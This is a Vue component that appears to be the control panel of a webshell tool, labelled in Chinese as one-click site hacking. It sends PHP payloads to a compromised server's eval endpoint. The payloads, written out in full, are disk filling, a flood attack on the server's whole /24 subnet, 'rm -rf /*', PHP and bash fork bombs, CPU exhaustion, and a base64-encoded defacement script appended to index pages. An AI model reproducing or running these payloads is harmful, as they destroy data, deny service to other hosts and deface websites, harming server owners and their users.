<script setup>
import { store } from '@/assets/store';
import { addPopup, postDataOrPopupError } from '@/assets/utils';
import { Base64 } from 'js-base64';
import { computed, ref } from 'vue';


const props = defineProps({
  session: String,
})

if (props.session) {
  store.session = props.session
} else {
  alert("未知错误：没有选中session")
}
const actionInput = ref("");
const actionResult = ref("")

async function postCode(code) {
  let result
  try {
    result = await postDataOrPopupError(`/session/${props.session}/php_eval`, {
      code: code.replace("{action_input_base64}", Base64.encode(actionInput.value))
    })
  } catch (e) {
    addPopup("yellow", "有些脚本会一直进行", "所以会造成超时错误，不用担心")
    throw e
  }

  actionResult.value = result
  actionInput.value = ""
}

async function writeBlackPage(code, html) {
  if (actionInput.value == "") {
    actionResult.value = "输入你要挂的消息（Hacked by xxx之类的）"
  } else {
    actionInput.value = ""
    await postCode(code.replace("HTML_B64", Base64.encode(html)));
  }
}

const blackPageHtml = computed(() => {
  const codeOrig = atob("Pz4KPHNjcmlwdD4KICBmdW5jdGlvbiBhZGROb2lzeVRleHQoKSB7CiAgICBmdW5jdGlvbiBzZXRQb3ModHJhbnNpdGlvbikgewogICAgICBwLnN0eWxlID0gYAogICAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICAgIHotaW5kZXg6IDExNDUxNDsKICAgICAgZm9udC1zaXplOiA2MHB4OwogICAgICBmb250LWZhbWlseTogJ0NvdXJpZXIgTmV3JywgbW9ub3NwYWNlOwogICAgICBmb250LXdlaWdodDogYm9sZGVyOwogICAgICB0b3A6ICR7TWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogKHdpbmRvdy5pbm5lckhlaWdodCAtIDIwMCkgKyB3aW5kb3cucGFnZVlPZmZzZXQpfXB4OwogICAgICBsZWZ0OiAke01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqICh3aW5kb3cuaW5uZXJXaWR0aCAqIDAuNikgKyB3aW5kb3cucGFnZVhPZmZzZXQpfXB4OwogICAgICB0cmFuc2l0aW9uOiBhbGwgJHt0cmFuc2l0aW9uIHx8ICIycyJ9OwogICAgICBhbmltYXRpb246IGdsb3dpbmcgMnMgaW5maW5pdGU7CiAgICBgCiAgICB9CgogICAgZnVuY3Rpb24gcmVjU2V0UG9zKCkgewogICAgICBzZXRQb3MoKQogICAgICBzZXRUaW1lb3V0KHJlY1NldFBvcywgTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogMTAwMCArIDIwMDApKQogICAgfQoKICAgIGxldCBwID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgicCIpCiAgICBsZXQgc3R5bGUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzdHlsZSIpCiAgICBzdHlsZS50ZXh0Q29udGVudCA9IGAKICAgIEBrZXlmcmFtZXMgZ2xvd2luZyB7CiAgICAgIDAlIHt0ZXh0LXNoYWRvdzogM3B4IDNweCAycHggcmdiKDI1NSwgMCwgMCk7fQogICAgICAzMyUge3RleHQtc2hhZG93OiAzcHggM3B4IDJweCByZ2IoMCwgMjU1LCAwKTt9CiAgICAgIDY2JSB7dGV4dC1zaGFkb3c6IDNweCAzcHggMnB4IHJnYigwLCAwLCAyNTUpO30KICAgICAgMTAwJSB7dGV4dC1zaGFkb3c6IDNweCAzcHggMnB4IHJnYigyNTUsIDAsIDApO30KICAgIH0KICAgIGAKICAgIHAudGV4dENvbnRlbnQgPSAiSEFDS0VEX0JZX01FIgogICAgcC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbiAoKSB7CiAgICAgIHNldFBvcygiMHMiKQogICAgfSkKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocCkKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc3R5bGUpCiAgICByZWNTZXRQb3MoKQogIH0KICBmb3IgKGxldCBpID0gMDsgaSA8IDEwOyBpKyspIHsKICAgIHNldFRpbWVvdXQoYWRkTm9pc3lUZXh0LCBpICogNTAwKQogIH0KCjwvc2NyaXB0Pg==")
  return codeOrig.replace("HACKED_BY_ME", actionInput.value)
})


const helloWorldCode = `
$name = base64_decode('{action_input_base64}');
if($name == "") {
  echo "请在输入框中输入名字";
}else{
  echo "Hello, $name";
}
`

const writeTrashCode = `
ignore_user_abort(true);
set_time_limit(0);
session_write_close();
while(1) {
  $fp = tmpfile();
  if ($fp) {
    fwrite($fp, uniqid());
    fclose($fp);
  }
}
`

const ddosCode = `
ignore_user_abort(true);
set_time_limit(0);
session_write_close();
$myip = base64_decode('{action_input_base64}');
$content = "GET / HTTP/1.1\\r
Host: IP\\r
\\r";
if(!$myip) {
  echo ("给一个C段中的IP");
}else{
  while(1) {
    for($i = 0; $i < 256; $i ++) {
      $targetip = long2ip((ip2long($myip) & 0xffffff00) + $i);
      if($targetip == $myip) {
        continue;
      }
      for($j = 0; $j < 1000; $j ++) {
        $socket = fsockopen($targetip, 80, $error_code, $error_message);
        if(!$socket) {
          break;
        }
        fwrite($socket, str_replace($targetip, "IP", $content));
        fclose($socket);
      }
    }
  }
}
`

const blackPageCode = `
$code = base64_decode('HTML_B64');
if(file_exists('index.html')) {
  file_put_contents('index.html', $code, FILE_APPEND);
  echo "写入到index.html...";
}
if(file_exists('index.php')) {
  file_put_contents('index.php', $code, FILE_APPEND);
  echo "写入到index.php...";
}
`

const phpForkBombCode = `
ignore_user_abort(true);
set_time_limit(0);
session_write_close();
if(!function_exists('pcntl_fork')) {
  echo "没有pcntl_fork函数！";
}else{
  while (1) {
    pcntl_fork();
  }
}
`

const bashForkBombCode = `
$code = 'x(){ x|x & };x';
system($code);
`

const rmRfCode = `
passthru('rm -rf /*', $ret);
echo "运行完成，返回码为$ret";
`

const phpCpuBombCode = `
ignore_user_abort(true);
set_time_limit(0);
session_write_close();
$content = file_get_contents("/proc/cpuinfo");
while (1) {
  $a = md5($content);
}
`

</script>

<template>
  <div class="actionmain">
    <div class="action-group">
      <p class="group-title shadow">
        一键日站
      </p>
      <div class="actions shadow">
        <button class="action" title="检查对面服务器是否健在" @click="postCode(helloWorldCode)">
          一键你好（测试用）
        </button>
        <button class="action" title="不断创建临时垃圾文件" @click="postCode(writeTrashCode)">
          一键写垃圾文件
        </button>
        <button class="action" title="一键DDoS当前C段" @click="postCode(ddosCode)">
          一键DDoS内网
        </button>
        <button class="action" title="运行rm -rf /*" @click="postCode(rmRfCode)">
          一键rm -rf
        </button>
        <button class="action" title="在index.html和index.php后面加一点料。。。"
          @click="writeBlackPage(blackPageCode, blackPageHtml)">
          一键挂黑页
        </button>
        <button class="action" title="调用pcntl_fork实现fork bomb" @click="postCode(phpForkBombCode)">
          一键Fork Bomb (PHP版)
        </button>
        <button class="action" title="使用system函数调用Linux Shell实现fork bomb" @click="postCode(bashForkBombCode)">
          一键Fork Bomb (Linux Shell版)
        </button>
        <button class="action" title="不断运行md5(xxx)，建议点个几十下" @click="postCode(phpCpuBombCode)">
          一键占满CPU（多点几下有惊喜）
        </button>
      </div>
    </div>
    <div class="action-input">
      <input type="text" class="shadow" v-model="actionInput" placeholder="如果action需要额外的信息在这里输入">
    </div>
    <textarea class="action-result shadow" v-model="actionResult">

  </textarea>

  </div>

</template>

<style scoped>
.actionmain {
  display: flex;
  flex-direction: column;
  align-items: center;
  height: 90%;
}

.action-group {
  display: flex;
  flex-direction: column;
  margin-bottom: 30px;
  width: 60%;
  margin-left: 20%;
  margin-right: 20%;
}

.group-title {
  background-color: var(--background-color-2);
  color: var(--font-color-white);
  width: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 28px;
  margin: 0;
  padding-top: 20px;
  padding-bottom: 20px;
  border-radius: 20px;
  margin-bottom: 10px;
}

.actions {
  background-color: var(--background-color-2);
  width: 100%;
  min-height: 200px;
  border-radius: 20px;
  margin-top: 20px;
  flex-grow: 1;
  display: grid;
  grid-template-columns: repeat(5, minmax(10px, 320px));
  grid-gap: 20px;
  padding: 20px;
}

.action {
  background-color: var(--background-color-3);
  color: var(--font-color-white);
  padding: 20px;
  height: 100px;
  outline: none;
  border: none;
  border-radius: 20px;
  font-size: 20px;
}

.action:hover {
  opacity: 0.9;
}

.action-input {
  width: 60%;
  display: flex;
  flex-direction: column;
  align-items: center;
}

.action-input input {
  width: 100%;
  height: 50px;
  background-color: var(--background-color-2);
  outline: none;
  border: none;
  border-radius: 20px;
  font-size: 24px;
  color: var(--font-color-white);
  padding-left: 15px;
  padding-right: 15px;
  margin-bottom: 30px;

}


.action-result {
  width: 60%;
  height: 100%;
  box-sizing: border-box;
  resize: none;

  background-color: var(--background-color-2);
  outline: none;
  border: none;
  border-radius: 20px;

  font-size: 20px;
  color: var(--font-color-white);
  padding: 10px;
}
</style>
